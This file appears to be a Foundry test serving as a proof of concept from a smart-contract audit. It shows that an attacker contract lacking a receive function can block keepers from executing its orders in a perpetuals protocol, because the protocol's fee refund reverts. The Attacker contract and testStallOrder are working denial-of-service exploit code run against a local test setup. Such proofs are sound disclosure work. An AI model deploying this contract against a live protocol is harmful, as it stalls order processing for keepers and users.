
// SPDX-License-Identifier: GPL-2.0
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {TargetFunctions} from "../TargetFunctions.sol";
import {FoundryAsserts} from "@chimera/FoundryAsserts.sol";

import "src/process/OracleProcess.sol";
import "src/interfaces/IOrder.sol";
import "src/storage/Order.sol";
import "src/interfaces/IStake.sol";
import "src/interfaces/IPosition.sol";
import "src/mock/MockToken.sol";
import "src/storage/RoleAccessControl.sol";
import "src/utils/Errors.sol";
import "src/utils/TransferUtils.sol";
import "src/utils/CalUtils.sol";
import "src/utils/AddressUtils.sol";
import "src/vault/Vault.sol";

import "../../constants/ChainConfig.sol";
import "../../constants/MarketConfig.sol";
import "../../constants/RolesAndPools.sol";
import "../../constants/StakeConfig.sol";
import "../../constants/TradeConfig.sol";
import "../../constants/UsdcTradeConfig.sol";
import "../../constants/WbtcTradeConfig.sol";
import "../../constants/WethTradeConfig.sol";

contract AttackerCanStallOrder is Test, TargetFunctions, FoundryAsserts {
    Attacker attacker;

    function setUp() public {
        setup();
        attacker = new Attacker(diamondAddress);
    }


    function __mintStakeTokenRequest() internal {
        // Create Mint Params
        uint256 _answer = 50_000;
        BeforeAfterParamHelper memory beAfParams;
        IStake.MintStakeTokenParams memory params;
        beAfParams.oracles = getOracleParam(_answer);

        /// createOrder params setup
        params.stakeToken = stakedTokens[0];
        params.requestToken = address(weth);
        params.requestTokenAmount = 1000e18;
        params.walletRequestTokenAmount = 1000e18;
        params.minStakeAmount = 0;
        params.executionFee = ChainConfig.getMintGasFeeLimit();
        params.isCollateral = false;
        params.isNativeToken = false;

        uint256 requestId = diamondStakeFacet.createMintStakeTokenRequest{value: params.executionFee}(params);
        vm.prank(keeper);
        diamondStakeFacet.executeMintStakeToken(requestId, beAfParams.oracles);
        console2.log("requestId", requestId);
    }


    // forge test --match-test testStallOrder
    function testStallOrder() public {
        uint256 _answer = 50_000;
        BeforeAfterParamHelper memory beAfParams;
        IOrder.PlaceOrderParams memory params;
        beAfParams.oracles = getOracleParam(_answer);


        /// createOrder params setup
        params.symbol = MarketConfig.getWethSymbol();
        params.isCrossMargin = false;
        params.isNativeToken = false;
        params.orderSide = Order.Side.LONG;
        params.posSide = Order.PositionSide.INCREASE;
        params.orderType = Order.Type.MARKET;
        params.stopType = Order.StopType.NONE;
        params.marginToken = address(weth);
        params.qty = 0;
        params.orderMargin = 10e18;
        params.leverage = MarketConfig.getMaxLeverage() / 2;
        params.triggerPrice = 0; // triggerPrice 
        params.acceptablePrice = uint256(beAfParams.oracles[0].maxPrice);
        params.executionFee = ChainConfig.getPlaceIncreaseOrderGasFeeLimit() * 2; // Using excessive gas fee so that a portion will be refunded
        params.placeTime = block.timestamp;

        // Deal attacker some balance
        vm.startPrank(keeper); // keeper is also the admin in this example
        hevm.deal(address(attacker), TradeConfig.getEthInitialAllowance() * 1000); // Sets the eth balance of user to amt
        weth.mint(address(attacker), (TradeConfig.getWethInitialAllowance() * 1000) * (10 ** weth.decimals())); // Sets the weth balance of user to amt
        vm.stopPrank();

        vm.prank(USERS[0]);
        uint256 orderId = attacker.createOrder{value: params.executionFee}(params);
        console2.log(orderId);
        
        __mintStakeTokenRequest();
        vm.expectRevert();
        diamondOrderFacet.executeOrder(orderId, beAfParams.oracles);
    }
}

contract Attacker {
    IOrder diamondOrderFacet;

    constructor(address _diamond) {
        diamondOrderFacet =IOrder(_diamond);
    }

    function createOrder(IOrder.PlaceOrderParams memory params) public payable returns(uint256 orderId) {
        // Set allowance for diamond address
        IERC20(params.marginToken).approve(address(diamondOrderFacet), type(uint256).max);

        return diamondOrderFacet.createOrderRequest{value: msg.value}(params);
    }

    // No fallback or receive function
    // receive() external payable {} // toggle for test to fail with "Reason: call did not revert as expected"
}
